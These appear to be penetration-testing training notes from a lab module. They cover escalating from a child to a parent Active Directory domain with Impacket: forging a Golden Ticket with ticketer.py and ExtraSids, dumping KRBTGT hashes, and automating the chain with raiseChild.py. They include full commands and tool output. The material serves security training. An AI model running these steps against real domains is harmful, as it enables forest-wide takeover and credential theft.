# Attacking Domain Trusts - Child → Parent Trusts - from Linux

Same ExtraSids attack, performed from Linux. Same five data points required:
- KRBTGT hash for the child domain
- SID for the child domain
- A target username in the child domain (doesn't need to exist)
- FQDN of the child domain
- SID of the Enterprise Admins group of the root domain

## Step 4 — Forge the Golden Ticket with ticketer.py

[ticketer.py](https://github.com/SecureAuthCorp/impacket/blob/master/examples/ticketer.py) — `-domain-sid` scopes access to the child domain, `-extra-sid` adds parent-domain access.

```shellsession
s0nam@htb[/htb]$ ticketer.py -nthash 9d765b482771505cbe97411065964d5f -domain LOGISTICS.INLANEFREIGHT.LOCAL -domain-sid S-1-5-21-2806153819-209893948-922872689 -extra-sid S-1-5-21-3842939050-3880317879-2865463114-519 hacker

[*] Creating basic skeleton ticket and PAC Infos
[*] Customizing ticket for LOGISTICS.INLANEFREIGHT.LOCAL/hacker
[*]     PAC_LOGON_INFO
[*]     PAC_CLIENT_INFO_TYPE
[*]     EncTicketPart
[*]     EncAsRepPart
[*] Signing/Encrypting final ticket
[*]     PAC_SERVER_CHECKSUM
[*]     PAC_PRIVSVR_CHECKSUM
[*]     EncTicketPart
[*]     EncASRepPart
[*] Saving ticket in hacker.ccache
```

Saved as a **credential cache (ccache)** file for Kerberos auth. which is a file used to hold Kerberos credentials. Setting the `KRB5CCNAME` environment variable tells the system to use this file for Kerberos authentication attempts

## The Fast Path: raiseChild.py

[raiseChild.py](https://github.com/SecureAuthCorp/impacket/blob/master/examples/raiseChild.py) automates the entire child→parent escalation. Just supply the target DC and admin creds for the **child** domain.

### Workflow (per the tool's own documentation)

1. Locate the child DC and gather info (via [MS-NRPC])
2. Determine the forest FQDN (via [MS-NRPC])
3. Get the forest's Enterprise Admin SID (via [MS-LSAT])
4. Get the child domain's KRBTGT credentials (via [MS-DRSR])
5. Build a Golden Ticket with that SID in the `ExtraSids` array, expiring 10 years out
6. Use the ticket to log into the forest and retrieve target-user creds (KRBTGT/admin by default)
7. Optionally save the ticket in ccache format (`-w`)
8. Optionally launch a PSEXEC shell (`-target-exec`)

> [!danger] Understand before automating
> Knowing the manual process (as above) matters more than the convenience of `raiseChild.py`. If the tool fails partway through, understanding each step lets you troubleshoot rather than being stuck.
>
> **Never blindly run "autopwn" scripts against a client production environment.** Similar tools exist that take BloodHound data and auto-chain a full attack path to Domain Admin — best avoided in favor of tools you fully understand and control at each step.
>
> *"We don't want to tell the client that something broke because we used an 'autopwn' script!"*

## Key Takeaways

- [ ] Same five data points as the Windows version, gathered via Linux-native Impacket tooling
- [ ] `secretsdump.py ... -just-dc-user <DOMAIN>/krbtgt` for the KRBTGT hash
- [ ] `lookupsid.py <domain>/<user>@<dc-ip>` for SID brute-forcing — point it at each DC (child, then root) to get both SIDs
- [ ] `ticketer.py -nthash <hash> -domain <FQDN> -domain-sid <child-SID> -extra-sid <EA-SID> <fake-user>` forges the Golden Ticket
- [ ] `export KRB5CCNAME=<file>.ccache` then `psexec.py ... -k -no-pass` to use the forged ticket
- [ ] `raiseChild.py -target-exec <root-dc-ip> <child-domain>/<admin-user>` automates the entire chain — powerful but should only be used once you understand the manual process
- [ ] Never run autopwn-style tools blindly in a client production environment
